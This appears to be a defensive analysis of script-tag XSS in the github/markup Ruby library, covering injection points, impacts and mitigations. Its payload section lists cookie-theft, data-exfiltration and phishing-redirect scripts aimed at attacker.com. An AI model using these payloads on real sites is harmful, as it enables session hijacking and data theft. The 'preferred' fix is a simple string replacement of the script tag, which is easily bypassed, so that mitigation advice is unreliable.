## Deep Analysis: `<script>` Tag Injection (Cross-Site Scripting - XSS) in `github/markup`

This analysis delves into the `<script>` Tag Injection (Cross-Site Scripting - XSS) vulnerability within the context of the `github/markup` library. This path is marked as **CRITICAL** due to the severe potential impact on users and the application itself.

**Understanding `github/markup` in the Attack Context:**

`github/markup` is a Ruby library responsible for converting various markup languages (like Markdown, Textile, AsciiDoc, etc.) into HTML. Its primary function is to render user-provided content into a presentable format within web applications. The vulnerability arises when `github/markup` fails to adequately sanitize or escape user-supplied markup that includes malicious `<script>` tags.

**Detailed Breakdown of the Attack Path:**

1. **Attacker's Goal:** The attacker aims to execute arbitrary JavaScript code within the victim's browser, operating under the security context (domain, cookies, etc.) of the web application using `github/markup`.

2. **Injection Point:** The attacker needs a way to introduce malicious content that will be processed by `github/markup`. Common injection points include:
    * **User-generated content:**  Comments, forum posts, issue descriptions, wiki pages, or any other area where users can input markup.
    * **Data sources:**  Potentially through compromised data sources that feed into the application and are rendered using `github/markup`.
    * **URL parameters or form fields:**  If the application uses `github/markup` to render content based on URL parameters or form data without proper sanitization.

3. **The Malicious Payload:** The core of the attack is the `<script>` tag containing malicious JavaScript code. Examples include:
    * `<script>alert('XSS Vulnerability!');</script>` (Simple proof of concept)
    * `<script>document.location='https://attacker.com/steal?cookie='+document.cookie;</script>` (Cookie theft)
    * `<script>var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://attacker.com/log', true); xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(JSON.stringify({data: document.body.innerHTML}));</script>` (Data exfiltration)
    * `<script>window.location.href = 'https://attacker.com/phishing';</script>` (Redirection to a phishing site)

4. **Processing by `github/markup`:** When the application processes the user-provided markup containing the malicious `<script>` tag using `github/markup`, the library (if vulnerable) will fail to properly sanitize or escape this tag. This means the raw `<script>` tag will be included in the generated HTML output.

5. **Browser Interpretation:** The victim's browser, upon receiving the HTML containing the unsanitized `<script>` tag, will interpret and execute the JavaScript code within the context of the application's domain. This is the critical step where the attacker gains control.

**Why is this Critical?**

The ability to execute arbitrary JavaScript within the user's browser has devastating consequences:

* **Session Hijacking:** The attacker can steal session cookies, allowing them to impersonate the victim and gain unauthorized access to their account.
* **Cookie Theft:** Sensitive information stored in cookies can be exfiltrated.
* **Account Takeover:**  By manipulating the DOM or sending requests on behalf of the user, the attacker can change account credentials, perform actions, or even delete the account.
* **Data Theft:**  Access to sensitive data displayed on the page or accessible through API calls can be obtained.
* **Defacement:** The attacker can alter the appearance of the web page, displaying misleading information or malicious content.
* **Malware Distribution:** The injected script can redirect the user to malicious websites or trigger the download of malware.
* **Keylogging:**  The attacker can record the user's keystrokes, potentially capturing login credentials or other sensitive information.
* **Phishing:**  The attacker can inject fake login forms or other elements to trick the user into revealing their credentials.

**Focus on Unsanitized HTML:**

The core of this vulnerability lies in the lack of proper sanitization. `github/markup` is designed to handle various markup languages, and each language has its own syntax for embedding code or special characters. If the library doesn't correctly identify and neutralize potentially harmful HTML elements like `<script>`, it opens the door for XSS attacks.

**Specific Considerations for `github/markup`:**

* **Supported Markup Languages:**  The vulnerability might be more prevalent in certain markup languages supported by `github/markup` if their parsing or rendering logic has weaknesses.
* **Configuration Options:**  Are there any configuration options within `github/markup` that control the level of sanitization or escaping?  If so, incorrect configuration could exacerbate the issue.
* **Dependencies:**  Does `github/markup` rely on other libraries for HTML sanitization? If so, vulnerabilities in those dependencies could also contribute to the problem.
* **Update Cadence:**  Is the `github/markup` library actively maintained and updated with security patches? Outdated versions are more likely to contain known vulnerabilities.

**Mitigation Strategies (Recommendations for the Development Team):**

* **Output Encoding/Escaping:**  The most crucial defense is to **always encode or escape** the output generated by `github/markup` before it's rendered in the user's browser. This means converting potentially harmful characters (like `<`, `>`, `"`, `'`) into their HTML entities (e.g., `&lt;`, `&gt;`, `&quot;`, `&#39;`). This prevents the browser from interpreting them as HTML tags or script delimiters.
* **Contextual Output Encoding:**  Apply encoding appropriate to the context where the output is being used (e.g., HTML entity encoding for HTML content, JavaScript escaping for JavaScript strings).
* **Content Security Policy (CSP):** Implement a strong CSP to control the resources that the browser is allowed to load. This can help mitigate the impact of XSS by restricting the execution of inline scripts and scripts from untrusted sources.
* **Input Sanitization (with Caution):** While output encoding is preferred, input sanitization can be used to remove potentially harmful HTML tags and attributes. However, this approach is complex and prone to bypasses. **Whitelisting** allowed tags and attributes is generally safer than blacklisting. **It's crucial to note that relying solely on input sanitization is insufficient and output encoding is still necessary.**
* **Regular Security Audits and Penetration Testing:** Conduct regular security assessments to identify potential vulnerabilities in the application's use of `github/markup`.
* **Keep `github/markup` Updated:**  Ensure the library is updated to the latest version to benefit from security patches and bug fixes.
* **Consider Alternatives:** If the security risks associated with `github/markup` are deemed too high, explore alternative libraries or approaches for rendering markup that offer stronger security features.
* **Educate Developers:** Train developers on secure coding practices and the risks associated with XSS vulnerabilities.

**Code Examples (Illustrative):**

**Vulnerable Code (Conceptual):**

```ruby
# Potentially vulnerable if not properly escaped later
user_input = params[:content]
html_output = Markup(user_input).to_html
render inline: html_output
```

**Secure Code (Conceptual):**

```ruby
require 'erb' # Example for HTML escaping

user_input = params[:content]
html_output = Markup(user_input).to_html
escaped_output = ERB::Util.html_escape(html_output) # Escape the entire output
render inline: escaped_output
```

**OR (More Granular Control - Preferred):**

```ruby
require 'cgi'

user_input = params[:content]
html_output = Markup(user_input).to_html

# Escape potentially dangerous parts before rendering
safe_output = html_output.gsub('<script>', '&lt;script&gt;').gsub('</script>', '&lt;/script&gt;')
render inline: safe_output
```

**It's important to note that the specific escaping method will depend on the context and the templating engine used by the application.**  Using a robust HTML sanitization library designed for this purpose is generally recommended over manual string manipulation.

**Conclusion:**

The `<script>` Tag Injection (XSS) vulnerability in `github/markup` represents a significant security risk. The ability for attackers to inject and execute arbitrary JavaScript code can lead to severe consequences for users and the application. By understanding the mechanics of this attack path and implementing robust mitigation strategies, the development team can significantly reduce the risk of exploitation and protect their users. Prioritizing output encoding and staying up-to-date with security best practices are crucial for defending against this critical vulnerability.
